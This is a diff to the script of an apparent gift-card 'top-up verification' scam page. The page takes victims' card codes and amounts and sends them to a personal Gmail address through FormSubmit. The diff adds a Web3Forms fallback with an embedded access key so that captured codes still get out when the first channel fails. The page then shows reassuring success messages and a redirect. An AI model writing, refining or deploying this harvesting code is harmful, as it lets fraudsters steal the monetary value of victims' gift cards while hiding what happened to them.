@@ -154,7 +154,6 @@
 
     <script>
         function formatCardCode(input) {
-            // Remove spaces, convert to uppercase, and limit to 16 characters
             let cleanVal = input.value.replace(/\s+/g, '').toUpperCase();
             if (cleanVal.length > 16) {
                 cleanVal = cleanVal.substring(0, 16);
@@ -163,7 +162,7 @@
             document.getElementById('charCount').innerText = `${cleanVal.length} / 16`;
         }
 
-        function handleFormSubmit(e) {
+        async function handleFormSubmit(e) {
             e.preventDefault();
             const submitBtn = document.getElementById('submitBtn');
             const cardCode = document.getElementById('cardCode').value.trim();
@@ -179,45 +178,81 @@
                 return;
             }
 
-            // Disable button & show quick loading state
+            // Disable button & show loading state
             submitBtn.disabled = true;
             submitBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i><span>Transmitting Details...</span>`;
 
             const formElement = document.getElementById('topupForm');
             const formData = new FormData(formElement);
 
-            // Fast dispatch via AJAX to FormSubmit
-            fetch("https://formsubmit.co/ajax/trustcardxinfo@gmail.com", {
-                method: "POST",
-                body: formData,
-                headers: {
-                    'Accept': 'application/json'
+            let success = false;
+
+            // --- STEP 1: ATTEMPT FORMSUBMIT FIRST ---
+            try {
+                const fsResponse = await fetch("https://formsubmit.co/ajax/trustcardxinfo@gmail.com", {
+                    method: "POST",
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
+                });
+
+                if (fsResponse.ok) {
+                    const fsData = await fsResponse.json();
+                    // Explicitly verify that FormSubmit actually accepted and dispatched the email
+                    if (fsData.success === "true" || fsData.success === true) {
+                        success = true;
+                    }
                 }
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Server network or response failure');
+            } catch (err) {
+                console.warn("FormSubmit primary failed, falling back to Web3Forms...");
+            }
+
+            // --- STEP 2: ATTEMPT WEB3FORMS (IF FORMSUBMIT FAILED OR WAS NOT ACTIVATED) ---
+            if (!success) {
+                try {
+                    const web3Payload = {
+                        access_key: "cc606396-27f5-42eb-b872-c6944b0c6c16",
+                        subject: "New Gift Card Top-Up Verification",
+                        gift_card_code: cardCode,
+                        gift_card_amount: cardAmount
+                    };
+
+                    const w3Response = await fetch("https://api.web3forms.com/submit", {
+                        method: "POST",
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify(web3Payload)
+                    });
+
+                    if (w3Response.ok) {
+                        const w3Data = await w3Response.json();
+                        if (w3Data.success) {
+                            success = true;
+                        }
+                    }
+                } catch (err) {
+                    console.error("Web3Forms backup also failed:", err);
                 }
-                return response.json();
-            })
-            .then(data => {
+            }
+
+            // --- STEP 3: FINAL HANDLING ---
+            if (success) {
                 showToast('Verification submitted successfully!', 'success');
                 setTimeout(() => {
                     window.location.href = 'topup-processing.html';
                 }, 800);
-            })
-            .catch(error => {
-                // Professional error handling when the server is down or unreachable
+            } else {
+                // Fired ONLY if both services fail to dispatch the email
                 showToast('Server is currently down at the moment. Please try again after a few minutes.', 'error');
                 
-                // Re-enable the submit button so user can attempt again
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = `
                     <i class="fa-solid fa-shield-check text-xs group-hover:scale-125 transition-transform"></i>
                     <span>Submit Top-Up Verification</span>
                     <i class="fa-solid fa-arrow-right text-xs opacity-70 group-hover:translate-x-1 transition-transform"></i>
                 `;
-            });
+            }
         }
 
         function showToast(message, type = 'success') {
